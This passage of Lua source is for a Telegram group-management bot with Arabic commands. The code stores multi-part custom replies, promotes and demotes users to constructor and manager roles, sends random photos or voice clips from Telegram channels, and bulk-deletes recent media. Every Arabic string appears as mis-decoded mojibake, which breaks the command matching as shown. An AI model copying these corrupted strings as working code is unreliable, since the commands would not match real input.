if text == ("ΩΨ³Ψ­ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΩΨͺΨΉΨ―Ψ―Ω") and DevTshake(msg) then
 
local list = database:smembers(bot_id.."botss:tshake:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:tshake:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:tshake:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:tshake:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:tshake:List:Rd:Sudo")
end
send(msg.chat_id_, msg.id_,"ΨͺΩ Ψ­Ψ°Ω Ψ±Ψ―ΩΨ― Ψ§ΩΩΨͺΨΉΨ―Ψ―Ω")
end
if text == ("Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΩΨͺΨΉΨ―Ψ―Ω") and DevTshake(msg) then
 
local list = database:smembers(bot_id.."botss:tshake:List:Rd:Sudo")
text = "\nΩΨ§Ψ¦ΩΨ© Ψ±Ψ―ΩΨ― Ψ§ΩΩΨͺΨΉΨ―Ψ―Ω \nββββββββ\n"
for k,v in pairs(list) do
db = "Ψ±Ψ³Ψ§ΩΩ "
text = text..""..k.." => {"..v.."} => {"..db.."}\n"
end
if #list == 0 then
text = "ΩΨ§ ΨͺΩΨ¬Ψ― Ψ±Ψ―ΩΨ― ΩΨͺΨΉΨ―Ψ―Ω"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
end
if text == "Ψ§ΨΆΩ Ψ±Ψ― ΩΨͺΨΉΨ―Ψ―" and DevTshake(msg) then
 
database:set(bot_id.."botss:tshake:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"Ψ§Ψ±Ψ³Ω Ψ§ΩΨ±Ψ― Ψ§ΩΨ°Ω Ψ§Ψ±ΩΨ― Ψ§ΨΆΨ§ΩΨͺΩ")
end
if text == "Ψ­Ψ°Ω Ψ±Ψ― ΩΨͺΨΉΨ―Ψ―" and DevTshake(msg) then
 
database:set(bot_id.."botss:tshake:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"Ψ§Ψ±Ψ³Ω Ψ§ΩΨ§Ω Ψ§ΩΩΩΩΩ ΩΨ­Ψ°ΩΩΨ§ ")
end
if text then  
local test = database:get(bot_id.."botss:tshake:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:tshake:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:tshake:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:tshake:Add:Rd:Sudo:Text"..test, text)  
end  
send(msg.chat_id_, msg.id_,"ΨͺΩ Ψ­ΩΨΈ Ψ§ΩΨ±Ψ― Ψ§ΩΨ§ΩΩ Ψ§Ψ±Ψ³Ω Ψ§ΩΨ±Ψ― Ψ§ΩΨ«Ψ§ΩΩ")
return false  
end  
end
if text then  
local test = database:get(bot_id.."botss:tshake:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:tshake:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:tshake:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:tshake:Add:Rd:Sudo:Text1"..test, text)  
end  
send(msg.chat_id_, msg.id_,"ΨͺΩ Ψ­ΩΨΈ Ψ§ΩΨ±Ψ― Ψ§ΩΨ«Ψ§ΩΩ Ψ§Ψ±Ψ³Ω Ψ§ΩΨ±Ψ― Ψ§ΩΨ«Ψ§ΩΨ«")
return false  
end  
end
if text then  
local test = database:get(bot_id.."botss:tshake:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:tshake:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:tshake:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:tshake:Add:Rd:Sudo:Text2"..test, text)  
end  
send(msg.chat_id_, msg.id_,"ΨͺΩ Ψ­ΩΨΈ Ψ§ΩΨ±Ψ―")
return false  
end  
end
if text then
local Text = database:get(bot_id.."botss:tshake:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:tshake:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:tshake:Add:Rd:Sudo:Text2"..text)   
if Text or Text1 or Text2 then 
local texting = {
Text,
Text1,
Text2
}
Textes = math.random(#texting)
send(msg.chat_id_, msg.id_,texting[Textes])
end
end
if text == "ΩΩ Ψ?ΩΨ±ΩΩ Ψ¨Ψ§ΩΨ΅ΩΨ±" and not database:get(bot_id.."sing:for:me"..msg.chat_id_) then
ght = math.random(28,56);
local Text ='ΨͺΩ Ψ§Ψ?ΨͺΩΨ§Ψ± Ψ§ΩΩΩΨ·ΨΉ ΩΩ Ψ?ΩΨ±ΩΩ ΩΩ'
keyboard = {}
keyboard.inline_keyboard = {
{{text = 'ghost.',url="t.me/G500t"}},
{{text = 'Alamy.',url="t.me/j333x"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/koko12300/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == ("Ψ±ΩΨΉ ΩΨ§ΩΩ") and tonumber(msg.reply_to_message_id_) ~= 0 and DevBot(msg) then 
function Function_Tshake(extra, result, success)
database:sadd(bot_id.."Tshake:Basic:Constructor23"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ§ΩΩ")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ±ΩΨΉ ΩΨ§ΩΩ @(.*)$") and DevBot(msg) then 
local username = text:match("^Ψ±ΩΨΉ ΩΨ§ΩΩ @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"πβΏΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
return false 
end      
database:sadd(bot_id.."Tshake:Basic:Constructor23"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ§ΩΩ")  
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end

if text == "ΨΊΩΩΩΩ" and not database:get(bot_id.."sing:for:me"..msg.chat_id_) then
ght = math.random(3,200);
local Text ='ΨͺΩ Ψ§Ψ?ΨͺΩΨ§Ψ± Ψ§ΩΩΩΨ·ΨΉ Ψ§ΩΨ΅ΩΨͺΩ ΩΩ'
keyboard = {}
keyboard.inline_keyboard = {
{{text = 'ghost.',url="t.me/G500t"}},
{{text = 'Alamy.',url="t.me/j333x"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/Ccckkc/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == ("Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω") and tonumber(msg.reply_to_message_id_) ~= 0 and DevBot(msg) then 
function Function_Tshake(extra, result, success)
database:sadd(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω @(.*)$") and not DevBot(msg) then 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
local username = text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"πβΏΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
return false 
end      
database:sadd(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω")  
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
end,nil)   
end
if text and text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω (%d+)$") and not DevBot(msg) then 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
local userid = text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω (%d+)$") 
database:sadd(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω")  
return false
end
end,nil)   
end
if text == ("ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω") and tonumber(msg.reply_to_message_id_) ~= 0 and not DevBot(msg) then 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
function Function_Tshake(extra, result, success)
database:srem(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
end,nil)   
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω @(.*)$") and not DevBot(msg) then 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
local username = text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
database:srem(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_, result.id_)

Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ")  
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
end,nil)   
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω (%d+)$") and not DevBot(msg) then 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
local userid = text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω (%d+)$") 
database:srem(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ")  
return false
end
end,nil)   
end

if text == ("Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω") and tonumber(msg.reply_to_message_id_) ~= 0 and Constructoryyu(msg) then 
function Function_Tshake(extra, result, success)
database:sadd(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω @(.*)$") and Constructoryyu(msg) then 
local username = text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"πβΏΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
return false 
end      
database:sadd(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω")  
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω (%d+)$") and Constructoryyu(msg) then 
local userid = text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω (%d+)$") 
database:sadd(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω")  
return false
end
if text == ("ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω") and tonumber(msg.reply_to_message_id_) ~= 0 and Constructoryyu(msg) then 
function Function_Tshake(extra, result, success)
database:srem(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω @(.*)$") and Constructoryyu(msg) then 
local username = text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
database:srem(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_, result.id_)

Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ")  
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω (%d+)$") and Constructoryyu(msg) then 
local userid = text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω (%d+)$") 
database:srem(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ")  
return false
end

if text == "Ψ±ΩΨΉ ΩΩΨ΄Ψ¦" and tonumber(msg.reply_to_message_id_) ~= 0 and BasicConstructor(msg) then 
function Function_Tshake(extra, result, success)
database:sadd(bot_id.."Tshake:Constructor"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΨ΄Ψ¦ ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
end
if text and text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ @(.*)$") and BasicConstructor(msg) then 
local username = text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"πβΏΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
return false 
end      
database:sadd(bot_id.."Tshake:Constructor"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΨ΄Ψ¦ ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ")  
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
end
------------------------------------------------------------------------
if text and text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ (%d+)$") and BasicConstructor(msg) then 
local userid = text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ (%d+)$")
database:sadd(bot_id.."Tshake:Constructor"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΨ΄Ψ¦ ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ")  
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦$") and tonumber(msg.reply_to_message_id_) ~= 0 and BasicConstructor(msg) then
function Function_Tshake(extra, result, success)
database:srem(bot_id.."Tshake:Constructor"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
end
------------------------------------------------------------------------
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ @(.*)$") and BasicConstructor(msg) then 
local username = text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
database:srem(bot_id.."Tshake:Constructor"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ")  
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
end
------------------------------------------------------------------------
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ (%d+)$") and BasicConstructor(msg) then 
local userid = text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ (%d+)$")
database:srem(bot_id.."Tshake:Constructor"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ")  
end

if text == ("Ψ±ΩΨΉ ΩΨ―ΩΨ±") and tonumber(msg.reply_to_message_id_) ~= 0 and Constructor(msg) then 
function Function_Tshake(extra, result, success)
database:sadd(bot_id.."Tshake:Manager"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ―ΩΨ± Ψ§ΩΩΨ¬ΩΩΨΉΩ")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end  
if text and text == "ΩΨ³Ψ­ Ψ§ΩΩΩΨ―ΩΨ§" and Constructor(msg) then   
idmsgg = {[0]=msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
idmsgg[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = idmsgg},function(arg,data)
new = 0
idmsgg2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and data.messages_[i].content_ and data.messages_[i].content_.ID ~= "MessageText" then
idmsgg2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,idmsgg2)
end,nil)  
send(msg.chat_id_, msg.id_,"πβΏΨͺΩ Ψ§Ψ²Ψ§ΩΨ© 100 ΩΩ ΩΨ³Ψ§Ψ¦Ψ· ") 
end
if text and text:match("^Ψ±ΩΨΉ ΩΨ―ΩΨ± @(.*)$") and Constructor(msg) then 
local username = text:match("^Ψ±ΩΨΉ ΩΨ―ΩΨ± @(.*)$") 
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"πβΏΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
return false 
end      
database:sadd(bot_id.."Tshake:Manager"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ―ΩΨ± Ψ§ΩΩΨ¬ΩΩΨΉΩ")  
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end 

if text and text:match("^Ψ±ΩΨΉ ΩΨ―ΩΨ± (%d+)$") and Constructor(msg) then 
local userid = text:match("^Ψ±ΩΨΉ ΩΨ―ΩΨ± (%d+)$") 
database:sadd(bot_id.."Tshake:Manager"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","πβΏΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ―ΩΨ± Ψ§ΩΩΨ¬ΩΩΨΉΩ")  
return false
end  
if text == ("ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ±") and tonumber(msg.reply_to_message_id_) ~= 0 and Constructor(msg) then 
function Function_Tshake(extra, result, success)
database:srem(bot_id.."Tshake:Manager"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end  
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ± @(.*)$") and Constructor(msg) then 
local username = text:match("^ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ± @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
database:srem(bot_id.."Tshake:Manager"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘")  
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end  
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ± (%d+)$") and Constructor(msg) then 
local userid = text:match("^ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ± (%d+)$") 
database:srem(bot_id.."Tshake:Manager"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","πβΏΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘")  
return false
end

------------------------------------------------------------------------ adddev2 sudog
if text == ("Ψ±ΩΨΉ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then
   function Function_DRAGON(extra, result, success)
   database:sadd(bot_id.."Dev:SoFi:2", result.sender_user_id_)
